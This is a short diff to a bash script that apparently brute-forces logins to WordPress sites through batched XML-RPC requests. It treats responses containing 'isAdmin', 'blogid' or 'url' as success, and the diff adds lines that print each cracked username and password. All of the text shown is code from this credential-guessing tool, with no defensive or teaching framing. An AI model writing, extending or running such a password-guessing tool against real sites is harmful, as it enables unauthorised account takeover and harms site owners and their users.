@@ -94,6 +94,7 @@ while IFS= read -r PASS; do
         
         if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
           echo "[+] Found password: $PASSWORD"
+          echo "CREDENTIALS FOUND: $USER:$PASSWORD"
           break
         fi
       done <<< "$LAST_BATCH"
@@ -180,6 +181,7 @@ if [ $COUNTER -gt 0 ] && [ $SUCCESS -eq 0 ]; then
       
       if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
         echo "[+] Found password: $PASSWORD"
+        echo "CREDENTIALS FOUND: $USER:$PASSWORD"
         break
       fi
     done <<< "$LAST_BATCH"
